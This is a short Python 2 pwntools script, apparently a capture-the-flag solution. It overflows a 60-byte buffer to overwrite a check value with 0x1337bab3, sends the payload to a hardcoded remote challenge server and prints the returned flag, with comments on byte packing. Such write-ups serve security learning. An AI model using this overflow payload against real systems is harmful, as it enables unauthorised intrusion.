#!/usr/bin/python2

import sys
import os
import re
import struct
from pwn import *

##use python2 not python3 for ease of generating strings for payloads 

################################################################################################################
#           Building Payload to Test Exploit Locally
#
#
################################################################################################################

##IP="167.99.207.150"
##PORT=30511

payload_prefix = b"A"*60
payload = b"A"*60

test_struct=struct.pack("Q", 0x1337bab3)
#print("test_struct:", str(test_struct))
transformed_adr=str(test_struct)[:-17]+"'"
#print("transformed_adr:", transformed_adr)
##this is a (not very elegant) way to truncate the trailing 0's from the address in the payload string
##using the built-in flat() function from pwntools lib is a better (more elegant, more portable) solution


target_adr=p64(0x1337babe)
##same as above struct packing; there's really no benefit to using the packing functions here
##pwntools lib flat() is the true hero

#print("target adr:", target_adr)

payload+=test_struct
#payload=payload_prefix+str(test_struct)[:-17]
#payload=payload_prefix+transformed_adr
byte_newline=b'\n'
#payload=payload_prefix+target_adr+byte_newline
##this is unneccessary, if we use the sendline() func, then the newline chat is appended to the payload for us

##payload+=target_adr
#print("payload:", payload)

final_payload=flat(
        {60:0x1337bab3}
)
print("final_payload", final_payload)

#target.sendline(payload)
##conn.sendline(payload)
##print(conn.recvuntil("}"))
#print(target.recvuntil('}'))
#167.99.207.150:30511



################################################################################################################
#           Testing Remote Exploit
#
#
################################################################################################################

##remote exploit
#target=process("nc")
target=remote("167.99.207.150", 30511)

##have to use sendline() not send() so that the trailing \n is appended to the bytes payload
target.sendline(final_payload)
target.recvuntil("Here's a small gift")
flag=target.recv()

success(flag)
